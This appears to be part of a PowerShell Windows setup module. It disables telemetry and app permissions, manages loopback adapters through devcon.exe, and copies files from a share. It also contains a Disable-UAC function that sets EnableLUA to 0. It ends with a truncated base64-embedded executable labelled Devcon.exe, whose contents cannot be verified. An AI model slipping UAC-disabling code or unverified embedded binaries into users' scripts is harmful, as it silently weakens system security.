            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" `
            -Name "MaxTelemetryAllowed" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" `
            -Name "AllowTelemetry" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Feedback Prompts
        # Partly derived from this: https://winaero.com/change-feedback-frequency-windows-10/
        New-Item `
            -Path "HKCU:\SOFTWARE\Microsoft\Siuf" `
            -Confirm $false `
            -Force | Out-Null
        New-Item `
            -Path "HKCU:\SOFTWARE\Microsoft\Siuf\Rules" `
            -Confirm $false `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Siuf\Rules" `
            -Name "NumberOfSIUFInPeriod" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Activity History
        # This doesn't appear to be something that's controlled by the registry. I'll need to look a little deeper into this.

        # Disable Location Services
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" `
            -Name "SensorPermissionState" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

        # Disable Camera Services
        # This doesn't prohibit Windows Hello from functioning.
        # Also, the Windows Camera app needs to be explicitly denied access to prevent side-channel access to the webcam
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null
        New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\Microsoft.WindowsCamera_8wekyb3d8bbwe" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Microphone Services
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Voice Activation
         New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Speech_OneCore\Settings\VoiceActivation\UserPreferenceForAllApps" `
            -Name "AgentActivationEnabled" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

         # Disable Notifications
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Account Info Access
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Contacts Access
         # Evidently, this doesn't stop People from accessing your Contacts.
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Calendar Access
         # Evidently, this doesn't stop Mail and Calendar from accessing your Calendar.
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Phone Call Access
         # Evidently, this doesn't stop People from accessing your Phone Calls.
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCall" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Call History Access
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Email Access
         # Evidently, this doesn't stop Mail and Calendar from accessing your Email.
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Tasks Access
         # Evidently, this doesn't stop Mail and Calendar from accessing your Tasks.
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Radio Access
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Unpaired Device Communications
         # This might be required for Bluetooth Pairing
         New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null

         # Disable Background Apps
         New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" `
            -Name "GlobalUserDisabled" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null
         New-ItemProperty `
            -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" `
            -Name "BackgroundAppGlobalToggle" `
            -Value 0 `
            -PropertyType DWORD `
            -Force | Out-Null

         # Disable App Diagnostics
         # Not sure this is something that should be disabled in the long run, but it's contained here for posterity.
         New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" `
            -Name "Value" `
            -Value "Deny" `
            -PropertyType String `
            -Force | Out-Null
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Clear-Advertising"
        }
    }
}



<#
.SYNOPSIS
Optimizes and privatizes the Windows Update functionality.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core
#>
Function Optimize-WindowsUpdate {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Optimize-WindowsUpdate"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Optimize-WindowsUpdate"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        # This function will rely on a separate PowerShell Module for configuring Windows Update.
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Optimize-WindowsUpdate"
        }
    }
}



<#
.SYNOPSIS
Enables some developer stuff on the computer.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core
#>
Function Enable-DeveloperStuff {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Enable-DeveloperStuff"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Enable-DeveloperStuff"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        # Enable Developer Mode
        New-ItemProperty `
            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" `
            -Name "AllowDevelopmentWithoutDevLicense" `
            -Value 1 `
            -PropertyType DWORD `
            -Force | Out-Null
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Enable-DeveloperStuff"
        }
    }
}



<#
.SYNOPSIS
Obtains a file from a file server.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

Obtains a specific file from a specific file server. The client code will specify each of these values through parameters. Additionally, the function will require credentials, which knocks the requirements of the execution environment to PS 3.0. The use of the credentials is through a PSCredentials instance.

.PARAMETER SourcePath
The source location from where to look for the source file. THis can be a local or server path.

.PARAMETER SourceFile
The file to copy from the source, located within the SourcePath.

.PARAMETER DestPath
The destination location where you want to copy the source file to. This can be a local or server path.

.PARAMETER DestFile
The file that will be written at the destination. The filename can be either the same or different from the source.

.PARAMETER Creds
A PSCredential instance that will be used to authenticate with the server side of the equation, if necessary.

.EXAMPLE
Get-FileFromServer -SourcePath "\\Server\Path" -SourceFile "File.exe" -DestPath "C:\DestPath" -DestFile "File.exe" -Creds (New-Object -TypeName "System.Management.Automation.PSCredential" -Argument "Dom\UserName", (ConvertTo-SecureString -String "PWClearText" -AsPlainText -Force))
#>
Function Get-FileFromServer {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Please provide a path on a remote server to obtain a file from.")]
        [String]$SourcePath,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Please provide a file on a remote server to obtain.")]
        [String]$SourceFile,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Please provide a path on the local computer to place the remote file in.")]
        [String]$DestPath,
        [Parameter(Mandatory = $false, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Please provide the name of the new file on the local computer.")]
        [String]$DestFile = $SourceFile,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Please provide credentials to use to connect to the source.")]
        [PSCredential]$Creds
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Get-FileFromServer"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Get-FileFromServer"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        try {
            New-PSDrive `
                -Name Source `
                -PSProvider FileSystem `
                -Root $SourcePath `
                -Credential $Creds | Out-Null
            New-PSDrive `
                -Name Dest `
                -PSProvider FileSystem `
                -Root $DestPath | Out-Null
            Copy-Item `
                -Path "Source:\$SourceFile" `
                -Destination "Dest:\$DestFile" | Out-Null
            Remove-PSDrive `
                Source | Out-Null
            Remove-PSDrive `
                Dest | Out-Null
        } catch {
            # Write an error message to the Event Log
            # Throw an Exception
            throw "Exception caught in Get-FileFromServer :: Type = $($_.Exception.GetType().FullName) :: $($_.Exception.Message)"
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Get-FileFromServer"
        }
    }
}



<#
.SYNOPSIS
Adds a new loopback adapter to the system.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

Creates a single loopback adapter. The way this is accomplished is par for the course, but there are some nuances inherent in this process.

A single INF is used to instantiate any loopback adapter on Windows, which isn't a hude deal when only creating one insance. However, when more
than one is needed, a problem arises where both adapters are going to have the same names from the perspective of the driver, which manifests
when attempting to rename them or change parameters. However, this is no easy way to uniquely identify network adapters unless the INF file is
rewritten and recompiled, which could adversely affect the underlying driver used for that device. In light of this atrocity to man, a mock solution
has been devised that would be able to permit the instantiation of multiple loopback adapters, and to delete them as well. The means to the madness
relies on utilizing both this function and the client code that calls it.

This function has a parameter named IfIndex. If the value of this parameter is zero when called, it's assumed that no loopback adapter currently
exists on the system, and that this call is creating the first one. However, if the value of this parameters is not zero, when the function-local
variable loopbackAdapter is created, a compound conditional will be employed using the value of IfIndex to reduce the chances of it obtaining
multiple adapters (as would be the case with the former call). Hence, the value of IfIndex is expected to be a valid index of an existing interface
(although, there is no way for this function to currently verify the sanity of said value).

Now, because there is virtually no way to ascertain what the value of the index is going to be prior to the creation of the interface, this function
will return the index of the adapter that was just created to the caller. Hence, the client code has an opportunity to capture the index of the
previous adapter that was created. Subsequent calls to this function will be able to have that captured index interpolated into their calls. However,
it's obvious how this could become more convoluted, and perhaps unwieldy, when more than two adapters are in play. Because there's no pressing demand
for this to be universally seamless, we currently assume no more than two adapters.

.PARAMETER AdapterName
A custom name for the adapter to use once it's installed in the system.

.PARAMETER IPAddress
The IP Address to assign to the adapter. 

.PARAMETER Metric
The routing metric to assign to the adapter.

.PARAMETER MacAddress
The MAC Address to assign to the adapter.

.PARAMETER IfIndex
A fairly contentious adapter, this is responsible for helping to mitigate the confusion when creating more than one loopback adapter. See the function description for more information about the calling context.

.PARAMETER Mask
Subnet Mask in CIDR. The default is 32.

.OUTPUTS
A numeric value representing the Interface Index that was assigned by Windows to the new loopback adapter.
#>
Function New-LoopbackAdapter {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "The name of the new adapter is missing. Please provide it.")]
        [String]$AdapterName,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "The IP Address of the new adapter is missing. Please provide it.")]
        [System.Net.IPAddress]$IPAddress,
        [Parameter(Mandatory = $false, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "The metric of the adapter is missing. Please provide it.")]
        [String]$Metric = "50",
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "The MAC Address of the adapter is missing. Please provide it.")]
        [AllowEmptyString()]
        [String]$MACAddress,
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "Interface ID is not specified. Please provide it.")]
        [String]$IfIndex,
        [Parameter(Mandatory = $false, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "While the mask isn't required, understand the default value is 32.")]
        [Byte]$Mask = 32
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Get-FileFromServer"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Get-FileFromServer"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        $devconFound = Test-Path -Path .\devcon.exe
        if(-NOT($devconFound)) {
            throw New-Object `
                    -TypeName System.Exception
        }

        # Create the loopback adapter
        .\devcon.exe install $env:windir\inf\netloop.inf *MSLOOP | Out-Null

        # Obtain a handle to the new loopback adapter
        # I THINK THIS LINE IS CAUSING AN ERROR WHILE CREATING THE ADAPTER (SOFT ERROR)
        $loopbackAdapter = ''
        if(-NOT($IfIndex -EQ 0)) {
            $loopbackAdapter = Get-NetAdapter | Where-Object { (!($_.ifIndex -EQ $IfIndex)) -AND ($_.DriverDescription -EQ "Microsoft KM-TEST Loopback Adapter") } | Out-Null
        } else {
            $loopbackAdapter = Get-NetAdapter | Where-Object { $_.DriverDescription -EQ "Microsoft KM-TEST Loopback Adapter" } | Out-Null
        }

        # Rename the adapter to what the client code specified
        Rename-NetAdapter `
            -Name $loopbackAdapter.Name `
            -NewName $AdapterName | Out-Null

        # Change the MAC Address of the adapter
        Set-NetAdapter `
            -Name $AdapterName `
            -MacAddress $MACAddress | Out-Null

        # Change the IP Address
        New-NetIPAddress `
            -InterfaceAlias $AdapterName `
            -IPAddress $IPAddress.ToString() `
            -PrefixLength $Mask `
            -AddressFamily IPv4 | Out-Null

        # Modify the metric
        Set-NetIPInterface `
            -InterfaceIndex $loopbackAdapter.ifIndex `
            -InterfaceMetric $Metric `
            -WeakHostReceive Enabled `
            -WeakHostSend Enabled | Out-Null

        # Disable certain bindings
        Disable-NetAdapterBinding `
            -Name $AdapterName `
            -ComponentID ms_msclient | Out-Null
        Disable-NetAdapterBinding `
            -Name $AdapterName `
            -ComponentID ms_pacer | Out-Null
        Disable-NetAdapterBinding `
            -Name $AdapterName `
            -ComponentID ms_server | Out-Null
        Disable-NetAdapterBinding `
            -Name $AdapterName `
            -ComponentID ms_tcpip6 | Out-Null
        Disable-NetAdapterBinding `
            -Name $AdapterName `
            -ComponentID ms_lltdio | Out-Null

        $loopbackAdapter.ifIndex
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Get-FileFromServer"
        }
    }
}



<#
.SYNOPSIS
Removes a specified loopback adapter from the computer.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core

Removes a specific loopback adapter from the computer. The way this is done is by specifying a particular piece of hardware based on the
hardware class ID. The way that devcon works makes it a little peculiar to remove a single device, so some twisted logic needs applied
in order to make this work.

The context of the application dictates a considerable amount of said logic, but the gist of it goes a little like this:

It's assumed that two calls to the New-LoopbackAdapter function have already been made. Consequently, the host will now have two loopback
adapters. Because each of these adapters will be created with the same INF file, there are all sorts of eccentricities in their configurations.
Least of which concern the kind of data that can be used for deleting an adapter (the objective is not to retain both adapters, but to delete the
first one that was created). After a considerable amount of testing, it's assumed that the adapters will be created with the hardware IDs that
look like this:

ROOT\NET\xxxx

Where xxxx is a series of integers that get incremented each time a device is instantiated with the same INF file. There are some other
devices that follow this scheme, but the strings in them are quite different, and the one displayed above is the one that's seen with the
loopback adapters.

Here's the trouble: It's assumed, at least from testing, that the first loopback adapter will be created wiht the hardware ID ROOT\NET\0000
and that the second will be ROOT\NET\0001. While testing shows this to be true most every time, it's unclear if this would ever change depending
on the target version of Windows. Further, it's important to note that this particular piece of data _IS THE ONLY RELIABLE METHOD FOR TARGETING
A SPECIFIC ADAPTER_, and this is crucial since the methods which devcon exposes as a means for deleting adapters tend to target a swath of
devices and not just single ones.

.PARAMETER HwidCls
Hardware Class Specification
#>
Function Remove-LoopbackAdapter {
    Param (
        [Parameter(Mandatory = $true, `
                    ValueFromPipeline = $true, `
                    ValueFromPipelineByPropertyName = $true, `
                    HelpMessage = "HWID Class specification is required.")]
        [String]$HwidCls
    )
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Remove-LoopbackAdapter"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Remove-LoopbackAdapter"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        $devconFound = Test-Path -Path .\devcon.exe
        if(-NOT($devconFound)) {
            throw New-Object `
                    -TypeName System.Exception
        } 
        .\devcon.exe remove -net $HwidCls | Out-Null
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Remove-LoopbackAdapter"
        }
    }
}



<#
.SYNOPSIS
Disables User Account Control through the Windows Registry.

.DESCRIPTION
This function is compatible with the following operating systems: Windows

This function is compatible with the following editions of PowerShell: Desktop, Core
#>
Function Disable-UAC {
    Begin {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_ENTERFUN Disable-UAC"
        }
        if(-NOT(Assert-OSWindows)) {
            Write-Error `
                -Message "$ERRORMSG_OSCOMPAT Disable-UAC"
            throw(New-Object `
                -TypeName System.PlatformNotSupportedException)
        }
    }
    Process {
        $UACRegistryPath = "REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        $UACRegistryKey = "EnableLUA"
        if (Test-RegistryKey -RegistryPath $UACRegistryPath -RegistryKey $UACRegistryKey) {
            Set-ItemProperty -Path $UACRegistryPath -Name $UACRegistryKey -Value 0 | Out-Null
        } else {
            New-ItemProperty -Path $UACRegistryPath -Name $UACRegistryKey -Value 0 -PropertyType "DWord" | Out-Null
        }
    }
    End {
        if($DEBUG -EQ $true) {
            Write-Host `
                "$DEBUGMSG_LEAVEFUN Disable-UAC"
        }
    }
}



<# Binary Embeds #>



<# Devcon.exe #>
$DEVCONBINARY = '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